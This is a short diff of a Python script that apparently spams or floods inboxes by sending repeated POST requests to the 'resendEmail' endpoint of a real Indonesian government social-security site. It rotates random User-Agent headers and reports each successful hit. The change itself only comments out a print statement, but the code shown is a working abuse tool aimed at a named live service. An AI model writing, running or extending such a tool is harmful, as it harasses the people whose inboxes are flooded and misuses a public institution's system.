@@ -33,7 +33,7 @@ def main(arg):
 	try:
 		parq = ({'User-Agent':rdm.choice(ua)})
 		r1 = requests.post('https://www.bpjsketenagakerjaan.go.id/pu/resendEmail',data = spam, headers=parq)
-		print(r1.text)
+		#print(r1.text)
 		s='Sukses'
 		if str(s) in str(r1.text):
 			print("\033[1;32m[+] SUKSES")
